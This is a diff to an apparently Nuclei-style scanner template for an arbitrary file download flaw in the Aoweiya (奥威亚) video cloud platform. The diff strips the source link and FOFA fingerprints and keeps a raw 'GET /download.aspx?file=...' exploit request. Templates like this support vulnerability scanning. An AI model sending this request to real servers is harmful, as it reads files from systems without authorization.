@@ -3,12 +3,8 @@ info:
   name: 奥威亚-视频云平台-download-任意文件下载
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gdy35nlwqt5wc73q'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gdy35nlwqt5wc73q
-    fofa: body="Copyright © 2005-2018 广州市奥威亚电子科技有限公司" body="/Upload/DomainInfo/MaxAVALogo.png" body="/CSS/NewtonTheme/assets/app.css"
 http:
 - raw:
   - 'GET /download.aspx?file=/Tools/AS/ASRoute.aspx HTTP/1.1
